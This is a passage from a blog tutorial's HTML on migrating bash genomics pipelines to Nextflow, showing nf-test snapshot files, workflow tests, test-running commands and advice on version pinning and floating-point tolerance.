<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># tests/modules/bwa_align.nf.test.snap</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">"Should align reads to reference"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">"content"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">"0"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">          </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">              </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">"id"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"sample1"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token string" style="color:hsl(119, 34%, 47%)">"sample1.bam:98a4d5f8c7b2e9f3a1d6c4b5e2f3g4h5"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">          </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">"bam"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">          </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">              </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">"id"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"sample1"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token string" style="color:hsl(119, 34%, 47%)">"sample1.bam:98a4d5f8c7b2e9f3a1d6c4b5e2f3g4h5"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">          </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">"timestamp"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"2026-02-11T15:45:30Z"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="full-migration-testing-with-nf-test">Full Migration Testing with nf-test<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#full-migration-testing-with-nf-test" class="hash-link" aria-label="Direct link to Full Migration Testing with nf-test" title="Direct link to Full Migration Testing with nf-test" translate="no">​</a></h3>
<p>Create comprehensive tests for your entire pipeline:</p>
<div class="language-groovy codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-groovy codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)">// tests/workflows/variant_calling.nf.test</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">nextflow_workflow </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    name </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"Test Complete Variant Calling Pipeline"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    script </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"workflows/variant_calling.nf"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    workflow </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"VARIANT_CALLING"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"Complete pipeline: reads to variants"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        when </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            workflow </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                input</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">id</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"sample1"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"data/reads.fastq.gz"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        then </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token function" style="color:hsl(221, 87%, 60%)">assertAll</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">assert</span><span class="token plain"> workflow</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">success </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                </span><span class="token comment" style="color:hsl(230, 4%, 64%)">// Snapshot bam output</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">assert</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">snapshot</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">workflow</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">out</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">bam</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">match</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                </span><span class="token comment" style="color:hsl(230, 4%, 64%)">// Snapshot vcf output</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">assert</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">snapshot</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">workflow</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">out</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">vcf</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">match</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                </span><span class="token comment" style="color:hsl(230, 4%, 64%)">// Verify intermediate files</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">assert</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">workflow</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">out</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">bam</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">exists</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">assert</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">workflow</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">out</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">vcf</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">exists</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="running-nf-test-in-your-migration-workflow">Running nf-test in Your Migration Workflow<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#running-nf-test-in-your-migration-workflow" class="hash-link" aria-label="Direct link to Running nf-test in Your Migration Workflow" title="Direct link to Running nf-test in Your Migration Workflow" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Generate initial snapshots from your Nextflow pipeline</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">nf-test </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">test</span><span class="token plain"> tests/main.nf.test --update-snapshot</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Compare against baseline (this is your validation step 3!)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">nf-test </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">test</span><span class="token plain"> tests/main.nf.test</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># If tests fail, review the diff</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># If diff is intentional, update snapshots</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">nf-test </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">test</span><span class="token plain"> tests/main.nf.test --update-snapshot</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run specific test file</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">nf-test </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">test</span><span class="token plain"> tests/workflows/variant_calling.nf.test</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run in CI/CD to catch regressions</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># .github/workflows/test.yml</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">- name: Test Nextflow Pipeline</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  run: nf-test </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">test</span><span class="token plain"> tests/ </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--profile</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-complete-migration-workflow-with-nf-test">The Complete Migration Workflow with nf-test<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#the-complete-migration-workflow-with-nf-test" class="hash-link" aria-label="Direct link to The Complete Migration Workflow with nf-test" title="Direct link to The Complete Migration Workflow with nf-test" translate="no">​</a></h3>
<ol>
<li class="">
<p><strong>Step 1 (Original Pipeline):</strong> Generate baseline MD5 snapshots (same as before)</p>
</li>
<li class="">
<p><strong>Step 2 (Migrate to Nextflow):</strong> Write Nextflow pipeline + nf-test tests</p>
</li>
<li class="">
<p><strong>Step 3 (Validate with nf-test):</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Generate initial snapshots from migrated Nextflow pipeline</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">nf-test </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">test</span><span class="token plain"> tests/main.nf.test --update-snapshot</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run: nf-test test tests/main.nf.test</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># nf-test automatically compares against baseline!</span><br></span></code></pre></div></div>
</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="benefits-of-nf-test-over-manual-validation">Benefits of nf-test Over Manual Validation<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#benefits-of-nf-test-over-manual-validation" class="hash-link" aria-label="Direct link to Benefits of nf-test Over Manual Validation" title="Direct link to Benefits of nf-test Over Manual Validation" translate="no">​</a></h3>
<table><thead><tr><th>Aspect</th><th>Manual Validation</th><th>nf-test</th></tr></thead><tbody><tr><td><strong>Snapshot generation</strong></td><td>Manual scripting</td><td>Automatic</td></tr><tr><td><strong>Version control</strong></td><td>External files</td><td>Git-tracked</td></tr><tr><td><strong>Team collaboration</strong></td><td>Share scripts</td><td>Share snapshots</td></tr><tr><td><strong>Regression detection</strong></td><td>Manual comparison</td><td>Automatic CI/CD</td></tr><tr><td><strong>Update process</strong></td><td>Rerun scripts</td><td><code>nf-test test --update-snapshot</code></td></tr><tr><td><strong>Documentation</strong></td><td>Separate docs</td><td>Tests are docs</td></tr><tr><td><strong>Maintenance</strong></td><td>High effort</td><td>Low effort</td></tr></tbody></table>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="key-considerations-and-best-practices">Key Considerations and Best Practices<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#key-considerations-and-best-practices" class="hash-link" aria-label="Direct link to Key Considerations and Best Practices" title="Direct link to Key Considerations and Best Practices" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-version-pinning">1. Version Pinning<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#1-version-pinning" class="hash-link" aria-label="Direct link to 1. Version Pinning" title="Direct link to 1. Version Pinning" translate="no">​</a></h3>
<p>Always pin tool versions in both pipelines:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bwa </span><span class="token number" style="color:hsl(35, 99%, 36%)">0.7</span><span class="token plain">.17</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">samtools </span><span class="token number" style="color:hsl(35, 99%, 36%)">1.18</span><span class="token plain">.0</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools </span><span class="token number" style="color:hsl(35, 99%, 36%)">1.18</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Nextflow (container)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">container </span><span class="token string" style="color:hsl(119, 34%, 47%)">'community.wave.seqera.io/library/bwa_samtools:56c9f8d5201889a4'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Container hash includes specific versions</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-handling-floating-point-precision">2. Handling Floating-Point Precision<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#2-handling-floating-point-precision" class="hash-link" aria-label="Direct link to 2. Handling Floating-Point Precision" title="Direct link to 2. Handling Floating-Point Precision" translate="no">​</a></h3>
<p>Some tools produce slightly different floating-point values due to compilation or CPU differences:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># For VCF QUAL scores, allow small differences</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function-name function" style="color:hsl(221, 87%, 60%)">compare_vcf_quality</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">baseline</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$1</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">migrated</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$2</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">tolerance</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">0.1</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Extract QUAL scores and compare with 